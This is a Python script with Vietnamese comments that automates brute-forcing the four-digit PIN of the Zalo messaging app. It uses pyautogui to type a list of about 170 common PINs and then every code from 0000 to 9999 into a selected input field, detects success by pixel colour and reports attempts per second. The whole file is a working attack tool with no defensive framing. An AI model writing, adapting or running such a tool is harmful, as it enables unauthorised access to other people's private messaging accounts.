import pyautogui
import keyboard
import time

# Danh sách các PIN dễ đoán
common_pins = [
    "0000", "1111", "2222", "3333", "4444", "5555", "6666", "7777", "8888", "9999",
    "1234", "4321", "1212", "6969", "1010", "2580", "0852", "1122", "1357", "2468",
    "1984", "2020", "1999", "2012", "1004", "7771", "0101", "1313", "1414", "1515",
    "1616", "1717", "1818", "1919", "2121", "2323", "2424", "2525", "2626", "2727",
    "2828", "2929", "0123", "2345", "3456", "4567", "5678", "6789", "7890", "0987",
    "9876", "8765", "7654", "6543", "5432", "4320", "3210", "2109", "0198", "0294",
    "0390", "0480", "1020", "2021", "2211", "1100", "1337", "2460", "1350", "3691",
    "9631", "1478", "2584", "3692", "1470", "1593", "7531", "7530", "8520", "9753",
    "8642", "7532", "6420", "4201", "3141", "2718", "1120", "1101", "1012", "2112",
    "1000", "2000", "3000", "4000", "5000", "6000", "7000", "8000", "9000", "0001",
    "0002", "0003", "0004", "0005", "0006", "0007", "0008", "0009", "9998", "9997",
    "1213", "1415", "1617", "1819", "2324", "2526", "2728", "2920", "3031", "3233",
    "3435", "3536", "3738", "3839", "4041", "4243", "4344", "4546", "4647", "4748",
    "4849", "5051", "5253", "5354", "5556", "5657", "5758", "5859", "6061", "6263",
    "6364", "6465", "6667", "6768", "6869", "6960", "7071", "7273", "7374", "7475",
    "7576", "7677", "7879", "7970", "8081", "8182", "8283", "8384", "8485", "8586",
    "8687", "8788", "8889", "8980", "9091", "9192", "9293", "9394", "9495", "9596"
]

# Hàm lấy tọa độ ô nhập từ chuột
def get_input_position():
    print("Di chuột đến ô nhập PIN, nhấn 'q' để xác nhận.")
    while True:
        if keyboard.is_pressed('q'):
            x, y = pyautogui.position()
            print(f"Tọa độ ô nhập: ({x}, {y})")
            return x, y

# Hàm kiểm tra ô trống (pixel)
def is_input_cleared(input_x, input_y):
    pixel_color = pyautogui.pixel(input_x, input_y)
    return pixel_color[0] > 200 and pixel_color[1] > 200 and pixel_color[2] > 200

# Hàm thử các PIN dễ đoán
def try_common_pins(input_x, input_y):
    pyautogui.click(input_x, input_y)
    print("Ô nhập đã được focus.")
    
    for pin in common_pins:
        if keyboard.is_pressed('p'):
            print("\nĐã dừng bởi phím 'p'.")
            return None
        print(f"Đang thử PIN dễ đoán: {pin}", end='\r')
        pyautogui.typewrite(pin, interval=0)
        
        if not is_input_cleared(input_x, input_y):
            print(f"\nTìm thấy PIN: {pin}!")
            return pin
    return None

# Hàm brute-force với chế độ
def brute_force_zalo_pin(input_x, input_y, start, end, mode):
    pyautogui.click(input_x, input_y)
    print("Ô nhập đã được focus.")
    
    start_time = time.time()
    attempt_count = 0
    
    for i in range(start, end + 1):
        if keyboard.is_pressed('p'):
            print("\nĐã dừng bởi phím 'p'.")
            break
        
        pin = f"{i:04d}"
        print(f"Đang thử PIN: {pin}", end='\r')
        pyautogui.typewrite(pin, interval=0)
        attempt_count += 1
        
        if mode == "normal" and not is_input_cleared(input_x, input_y):
            print(f"\nTìm thấy PIN: {pin}!")
            return pin
    
    end_time = time.time()
    elapsed_time = end_time - start_time
    if elapsed_time > 0:
        speed = attempt_count / elapsed_time
        print(f"\nThời gian chạy: {elapsed_time:.2f} giây")
        print(f"Số mã thử mỗi giây: {speed:.2f}")
    
    return None

# Chạy tool
if __name__ == "__main__":
    print("Chuẩn bị ô nhập PIN trên Zalo...")
    print("Nhấn 'p' để dừng bất cứ lúc nào.")
    
    input_x, input_y = get_input_position()
    
    choice = input("Bạn có muốn thử các PIN dễ đoán trước không? (y/n): ").lower()
    if choice == 'y':
        print("Thử các PIN dễ đoán trước...")
        found_pin = try_common_pins(input_x, input_y)
        if found_pin:
            print(f"PIN: {found_pin}")
            exit()
    
    mode = input("Chọn chế độ brute-force: fast/normal: ").strip().lower()
    if mode not in ["fast", "normal"]:
        print("Chế độ không hợp lệ, mặc định sử dụng fast.")
        mode = "fast"
    
    range_input = input("Nhập phạm vi brute-force (ví dụ '1234 9876' hoặc Enter để dùng 0000-9999): ").strip()
    if range_input:
        try:
            start, end = map(int, range_input.split())
            if start < 0 or end > 9999 or start > end:
                raise ValueError
        except ValueError:
            print("Phạm vi không hợp lệ, sử dụng mặc định 0000-9999.")
            start, end = 0, 9999
    else:
        start, end = 0, 9999
    
    print(f"Brute-force bắt đầu từ {start:04d} đến {end:04d} với chế độ {mode}...")
    found_pin = brute_force_zalo_pin(input_x, input_y, start, end, mode)
    
    if found_pin:
        print(f"PIN: {found_pin}")
